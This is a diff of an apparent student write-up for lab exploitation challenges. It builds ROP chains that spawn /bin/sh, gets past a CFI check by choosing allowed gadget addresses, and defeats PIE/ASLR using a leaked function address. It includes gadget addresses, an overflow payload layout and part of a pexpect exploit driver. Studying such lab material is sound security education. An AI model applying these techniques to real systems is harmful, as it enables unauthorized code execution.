@@ -5,8 +5,7 @@ Luigi Cussigh
 
 ## note
 
-i use ROPgadget, a tool for finding ROP gadgets in binaries:
-[https://github.com/JonathanSalwan/ROPgadget]
+i use ROPgadget, a tool for finding ROP gadgets in binaries: <https://github.com/JonathanSalwan/ROPgadget>
 
 ## challege 0
 
@@ -30,14 +29,15 @@ Contents of section .rodata:
 
 using ROPgadget we find a syscall gadget:
 
-ROPgadget --binary ./exploitme | grep syscall
+`ROPgadget --binary ./exploitme | grep syscall`
 
 0x000000000040134c : syscall
 
-also we need to set rdi, rsi, rdx, rax using pop gadgets
+also we need to set rdi, rsi, rdx, rax using pop gadgets:
 
-ROPgadget --binary ./exploitme | grep pop (register)
+`ROPgadget --binary ./exploitme | grep pop (register)`
 
+``` ROPgadget
 rdi:
 (no pop for rdi, we'll have to get creative..)
 
@@ -49,16 +49,19 @@ rdx:
 
 rax:
 (no pop for rax, we'll have to get creative..)
+```
 
 since we dont have rdi and rax pops (the most important ones...) we'll have to substitute:
 
-ROPgadget --binary ./exploitme | grep "mov rdi"
+`ROPgadget --binary ./exploitme | grep "mov rdi"`
 
+``` ROPgadget
 rdi: // compound_gadget_0
 0x0000000000401363 : mov rdi, rsi ; xor rsi, rsi ; xor rdx, rdx ; syscall
 
 rax:
 0x0000000000401230 : mov rax, rsi ; ret
+```
 
 we can run:
 
@@ -71,10 +74,13 @@ mov rdi, rsi ; xor rsi, rsi ; xor rdx, rdx ; syscall // the xor's set the regist
 () - words that need to be reversed byte by byte
 
 we'll just pass the first function:
+
+``` plaintext
 "0A"{272 - 2 bytes of random stuff}(00000000004015e9)(000000000000003b)(0000000000401230)(00000000004015e9)(0000000000402004)(0000000000401363)'\n'
   |        |                                           |                                                     |
   |        compensate for "0A"                         value of rax                                          address to "/bin/sh"
   to escape strtol
+```
 
 ## challenge 2
 
@@ -132,11 +138,12 @@ all do that.
 
 having found all of the gadgets, we can proceed to compile our payload.
 
-the id should just get the number 16, so we will just pass it:
-
+the id should get the number 16, so we will just pass it:
 b"16A"
 
-this way, the second gets will start to write in the previous unsafe stack frame.
+this way, the second gets() call will start to write in the previous unsafe stack frame's buffer
+
+we pass it these gadgets:
 
 0x0000000000402b90 : xor rax, rax ; ret
 0x0000000000402bd0 : add rax, 0x3b ; ret
@@ -144,6 +151,9 @@ this way, the second gets will start to write in the previous unsafe stack frame
 0x0000000000402b10 : mov into rax the address of "/bin/sh"
 0x0000000000402b70 : mov rax, rdx ; ret
 0x0000000000402c66 : xor rsi, rsi ; xor rdx, rdx ; syscall
+
+the sudden move to rdx is weird but its necessitated by the main executing code overwriting some of the registers.
+this might not be the only solution, but this works so im just going to leave it like this.
 
 ## challenge 3
 
@@ -189,25 +199,32 @@ cfi introduces a check before calling the function ptrs that are in the main's s
 
 the check allows only addresses that make the following statemenet true:
 
+``` schizolang
 rol((ptr-0x402f80), 0x3d) < 0x5,
+```
 
-which simplifies to
+which simplifies to:
 
+``` schizolang
 ror((ptr-0x402f80), 3) < 0x5
+```
 
-from here we know that the last three bits have to be 0 or else we will get a value thats really really big (bigger than 0x5)
-
+from here we know that the last three bits have to be 0 or else we will get a value thats really really big (bigger than 0x5).
 0x5 in binary is:
 
+``` plaintext
 0000000000000000000000000000000000000000000000000000000000000101
 0       8       16      24      32      40      48      56      64
+```
 
 so, ptr - 0x402f80 needs to be at least 1 lower than:
 
+``` plaintext
 0000000000000000000000000000000000000000000000000000000000101000
 0       8       16      24      32      40      48      56      64
 
 (=0x28)
+```
 
 and has to end with 3 0s, which is the same as saying that it has to be divisible by 8.
 
@@ -219,16 +236,17 @@ ptr - 0x402f80 should be less than 0x28 and be divisible by 8.
 
 so we can simplify,
 
-ptr should be less than (0x402f80 + 0x28) and be divisible by 8.
-                         = 0x402fa8
+ptr should be less than 0x402f80 + 0x28 (=0x402fa8) and be divisible by 8.
 
 this gives us a very small range of possible values of ptr:
 
+``` plaintext
 0x402fa0
 0x402f98
 0x402f90
 0x402f88
 0x402f80
+```
 
 we can't go neagtive with the expression ptr - 0x402f80 because if we do, the two complement value will become something absurdly big
 like 0xffff...0000
@@ -297,10 +315,10 @@ jumps to: (gadget_4)
 
 ```
 
-these gadgets are basically crafted to allow us to open a shell, we just have to write the leaked addresses in the correct order
-
+these gadgets are basically crafted to allow us to open a shell, we just have to write the leaked addresses in the correct order.
 we got:
 
+``` plaintext
 [gadget_0] - ???
 0x0000000000402fa0 : mov rax, 0xfffffffffffff000 ; and rax, QWORD PTR [rip+0x21fa] ; ret;
 [gadget_1] - (rax=rdi, rdi=rsi, rsi=0, rdx=0), syscall
@@ -311,6 +329,7 @@ we got:
 0x0000000000402f88 : mov rax, QWORD PTR [rip+0x25b9] ; ret;
 [gadget_4] - set eax = 0x35
 0x0000000000402f80 : mov eax, 0x35 ; ret;
+```
 
 let's examine the loop more closely:
 
@@ -349,6 +368,7 @@ after that, rbx stores the return value of the function (rax).
 
 if rax wasnt changed, rbx gets the funcptr value of rax.
 
+``` plaintext
 iter0:
 rdi = 0
 rbx = 0
@@ -402,10 +422,13 @@ rbx = rax = /bin/sh
 iter8:
 rsi = rbx = /bin/sh
 1: rax = rdi = 59, rdi = rsi = /bin/sh, rsi = 0, rdx = 0 syscall!!!
+```
 
 so the gadget chain is 4, 2, 2, 2, 2, 2, 2, 3, 1.
+
 which translates to writing
 
+``` plaintext
 0000000000402f80
 0000000000402f90
 0000000000402f90
@@ -415,6 +438,7 @@ which translates to writing
 0000000000402f90
 0000000000402f88
 0000000000402f98
+```
 
 to the funcptr buffer.
 
@@ -422,3 +446,223 @@ vuln_overflow and the stack layout seems to be the same as in the last challenge
 
 ## challenge 4
 
+the main function in challenge 4 is basically the same as in challenge 3.
+the only difference is that now its position independent
+
+``` asm
+2f34:           e8 07 ff ff ff        call   2e40 <vuln_leak@@Base>
+2f39:           e8 42 ff ff ff        call   2e80 <vuln_overflow@@Base>
+2f3e:           4c 8d 2d 8b 00 00 00  lea    r13,[rip+0x8b]        # 2fd0 <g_xxret@@Base>
+2f45:           31 ff                 xor    edi,edi
+2f47:           31 db                 xor    ebx,ebx
+2f49:       /-- eb 11                 jmp    2f5c <main@@Base+0x5c>
+2f4b:       |   0f 1f 44 00 00        nop    DWORD PTR [rax+rax*1+0x0]
+2f50: /-----|-> 49 ff c4              inc    r12
+2f53: |     |   49 81 fc 80 00 00 00  cmp    r12,0x80
+2f5a: |  /--|-- 74 30                 je     2f8c <main@@Base+0x8c>
+2f5c: |  |  \-> 4b 83 bc e7 00 fc ff  cmp    QWORD PTR [r15+r12*8-0x400],0x0
+2f63: |  |      ff 00 
+2f65: +--|----- 74 e9                 je     2f50 <main@@Base+0x50>
+2f67: |  |           4b 8b 84 e7 00 fc ff  mov    rax,QWORD PTR [r15+r12*8-0x400]
+2f6e: |  |           ff 
+2f6f: |  |           48 89 c1              mov    rcx,rax
+2f72: |  |           4c 29 e9              sub    rcx,r13
+2f75: |  |           48 c1 c1 3d           rol    rcx,0x3d
+2f79: |  |           48 83 f9 05           cmp    rcx,0x5
+2f7d: |  |  /--      73 29                 jae    2fa8 <main@@Base+0xa8>
+2f7f: |  |  |   48 89 de              mov    rsi,rbx
+2f82: |  |  |   ff d0                 call   rax
+2f84: |  |  |   48 89 df              mov    rdi,rbx
+2f87: |  |  |   48 89 c3              mov    rbx,rax
+2f8a: \--|--|-- eb c4                 jmp    2f50 <main@@Base+0x50>
+2f8c:    \--|-> 48 8d 3d 9b 11 00 00  lea    rdi,[rip+0x119b]        # 412e <_IO_stdin_used@@Base+0x12e>
+2f93:       |   e8 88 fe ff ff        call   2e20 <g_printf@@Base>
+2f98:       |   64 4d 89 3e           mov    QWORD PTR fs:[r14],r15
+2f9c:       |   31 c0                 xor    eax,eax
+2f9e:       |   5b                    pop    rbx
+2f9f:       |   41 5c                 pop    r12
+2fa1:       |   41 5d                 pop    r13
+2fa3:       |   41 5e                 pop    r14
+2fa5:       |   41 5f                 pop    r15
+2fa7:       |   c3                    ret
+2fa8:       \-> 67 0f b9 40 02        ud1    eax,DWORD PTR [eax+0x2]
+2fad:           0f 1f 00              nop    DWORD PTR [rax]
+```
+
+using similar logic as in the previous challenge, we infer that the only cfi safe gadget addresses should be
+less than 0x2fd0 + 0x28 (=0x2ff8) and divisible by 8 so we got:
+
+``` asm
+0000000000002ff0 <g_leak1@@Base>:
+    2ff0: e9 1b fe ff ff        jmp    2e10 <g_icall2@@Base+0x20>
+    2ff5: cc                    int3
+    2ff6: cc                    int3
+    2ff7: cc                    int3
+
+jumps to: (gadget_0)
+    2e10: 48 c7 c0 00 f0 ff ff  mov    rax,0xfffffffffffff000
+    2e17: 48 23 05 aa 31 00 00  and    rax,QWORD PTR [rip+0x31aa]        # 5fc8 <_IO_stdin_used@@Base+0x1fc8>
+    2e1e: c3                    ret
+    2e1f: 90                    nop
+
+0000000000002fe8 <g_syscall2@@Base>:
+    2fe8: e9 b3 fc ff ff        jmp    2ca0 <g_syscall@@Base+0x20>
+    2fed: cc                    int3
+    2fee: cc                    int3
+    2fef: cc                    int3
+
+jumps to: (gadget_1)
+    2ca0: 48 89 f8              mov    rax,rdi
+    2ca3: 48 89 f7              mov    rdi,rsi
+    2ca6: 48 31 f6              xor    rsi,rsi
+    2ca9: 48 31 d2              xor    rdx,rdx
+    2cac: 0f 05                 syscall
+
+0000000000002fe0 <gaddyy@@Base>:
+    2fe0: e9 4b fc ff ff        jmp    2c30 <g_poprdx@@Base+0x10>
+    2fe5: cc                    int3
+    2fe6: cc                    int3
+    2fe7: cc                    int3
+
+jumps to: (gadget_2)
+    2c30: 48 8d 47 02           lea    rax,[rdi+0x2]
+    2c34: c3                    ret
+    2c35: 66 2e 0f 1f 84 00 00  cs nop WORD PTR [rax+rax*1+0x0]
+    2c3c: 00 00 00 
+    2c3f: 90                    nop
+
+0000000000002fd8 <g_sh@@Base>:
+    2fd8: e9 53 fb ff ff        jmp    2b30 <g_rax2rdi@@Base+0x10>
+    2fdd: cc                    int3
+    2fde: cc                    int3
+    2fdf: cc                    int3
+
+jumps to: (gadget_3)
+    2b30: 48 8b 05 99 35 00 00  mov    rax,QWORD PTR [rip+0x3599]        # 60d0 <binsh@@Base>
+    2b37: c3                    ret
+
+0000000000002fd0 <g_xxret@@Base>:
+    2fd0: e9 1b fb ff ff        jmp    2af0 <g_yyret@@Base+0x10>
+    2fd5: cc                    int3
+    2fd6: cc                    int3
+    2fd7: cc                    int3
+
+jumps to: (gadget_4)
+    2af0: b8 35 00 00 00        mov    eax,0x35
+    2af5: c3                    ret
+
+```
+
+again, these gadgets are basically crafted to allow us to open a shell, we just have to write the leaked addresses in the correct order.
+we got:
+
+``` plaintext
+[gadget_0] - and something somehting
+PIE_OFFSET + 0x2ff0 : mov rax, 0xfffffffffffff000 ; and rax, QWORD PTR [rip+0x31aa] ; ret;
+[gadget_1] - setup for syscall (execve: rax=syscall_num, rdi=path, rsi=argv, rdx=envp)
+PIE_OFFSET + 0x2fe8 : mov rax, rdi ; mov rdi, rsi ; xor rsi, rsi ; xor rdx, rdx ; syscall ; xor eax, eax ; ret;
+[gadget_2] - rax = rdi + 2
+PIE_OFFSET + 0x2fe0 : lea rax, [rdi+0x2] ; ret;
+[gadget_3] - load address of "/bin/sh" string into rax
+PIE_OFFSET + 0x2fd8 : mov rax, QWORD PTR [rip+0x3599] ; ret;
+[gadget_4] - set eax = 0x35 (=53 dec)
+PIE_OFFSET + 0x2fd0 : mov eax, 0x35 ; ret;
+```
+
+the exploit.py main driver supplies us with the func_addr and the funcptr_addr:
+
+``` py
+p = pexpect.spawn("./{}".format(target))
+p.logfile = sys.stdout.buffer
+tty.setraw(p.child_fd)
+
+p.expect(r'(0x[0-9a-f]+)')
+func_addr = int(p.match.group(1), 16)
+
+p.expect(r'(0x[0-9a-f]+)')
+funcptr_addr = int(p.match.group(1), 16)
+
+p.expect("Enter id:")
+id = exploit.get_id(func_addr, funcptr_addr)
+p.sendline(id)
+
+p.expect("Enter password:")
+password = exploit.get_password(func_addr, funcptr_addr)
+p.sendline(password)
+```
+
+so whatever is in func_addr is the output of:
+
+``` asm
+0000000000002e40 <vuln_leak@@Base>:
+    2e40: 41 56                 push   r14
+    2e42: 53                    push   rbx
+    2e43: 50                    push   rax
+    2e44: 48 89 fb              mov    rbx,rdi
+    2e47: 4c 8d 35 dc 12 00 00  lea    r14,[rip+0x12dc]        # 412a <_IO_stdin_used@@Base+0x12a>
+    2e4e: 48 8d 35 eb ff ff ff  lea    rsi,[rip+0xffffffffffffffeb]        # 2e40 <vuln_leak@@Base>
+    2e55: 4c 89 f7              mov    rdi,r14
+    2e58: 31 c0                 xor    eax,eax
+    2e5a: e8 21 f2 ff ff        call   2080 <printf@plt>
+```
+
+and whatever is in func addr is the output of:
+
+``` asm
+    2e5f: 4c 89 f7              mov    rdi,r14
+    2e62: 48 89 de              mov    rsi,rbx
+    2e65: 31 c0                 xor    eax,eax
+    2e67: 48 83 c4 08           add    rsp,0x8
+    2e6b: 5b                    pop    rbx
+    2e6c: 41 5e                 pop    r14
+    2e6e: e9 0d f2 ff ff        jmp    2080 <printf@plt>
+```
+
+we notice that in r14, is the stdin format string, while in the next argument - rsi - the value of the thing that
+the code leaks is stored.
+
+so the first time printf is called, rsi contains the address of vuln_leak.
+the second time printf is called, rsi contains rbx, which in turn contains rdi, the first arg passed to vuln_leak.
+the address, passed to vuln_leak is the address of the main's unsafe stack buffer (where all the functions are stored)
+
+now, we want to pass the same gadget sequence to the buffer. but we first have to figure out what the addresses are at runtime.
+the driver python script intercepts the address of vuln_leak. since offsets between functions in .text is constant even if ASLR is on,
+we can use the leaked address of vuln_leak and compute the actual randomized addresses with it by pre-calculating the offsets of our
+gadgets by analyzing the objdump.
+
+so assuming our vuln_leak is:
+
+``` asm
+0000000000002e40 <vuln_leak@@Base>:
+    2e40: 41 56                 push   r14
+    2e42: 53                    push   rbx
+    2e43: 50                    push   rax
+    2e44: 48 89 fb              mov    rbx,rdi
+    2e47: 4c 8d 35 dc 12 00 00  lea    r14,[rip+0x12dc]        # 412a <_IO_stdin_used@@Base+0x12a>
+    2e4e: 48 8d 35 eb ff ff ff  lea    rsi,[rip+0xffffffffffffffeb]        # 2e40 <vuln_leak@@Base>
+    2e55: 4c 89 f7              mov    rdi,r14
+    2e58: 31 c0                 xor    eax,eax
+    2e5a: e8 21 f2 ff ff        call   2080 <printf@plt>
+    2e5f: 4c 89 f7              mov    rdi,r14
+    2e62: 48 89 de              mov    rsi,rbx
+    2e65: 31 c0                 xor    eax,eax
+    2e67: 48 83 c4 08           add    rsp,0x8
+    2e6b: 5b                    pop    rbx
+    2e6c: 41 5e                 pop    r14
+    2e6e: e9 0d f2 ff ff        jmp    2080 <printf@plt>
+    2e73: 66 2e 0f 1f 84 00 00  cs nop WORD PTR [rax+rax*1+0x0]
+    2e7a: 00 00 00 
+    2e7d: 0f 1f 00              nop    DWORD PTR [rax]
+```
+
+we compute:
+
+``` plaintext
+gadget_0_offset: 0x2ff0 - 0x2e40 = 0x1b0
+gadget_1_offset: 0x2fe8 - 0x2e40 = 0x1a8
+gadget_2_offset: 0x2fe0 - 0x2e40 = 0x1a0
+gadget_3_offset: 0x2fd8 - 0x2e40 = 0x198
+gadget_4_offset: 0x2fd0 - 0x2e40 = 0x190
+```
+
+now we just have to feed these offsets to our python program and we are DONE!
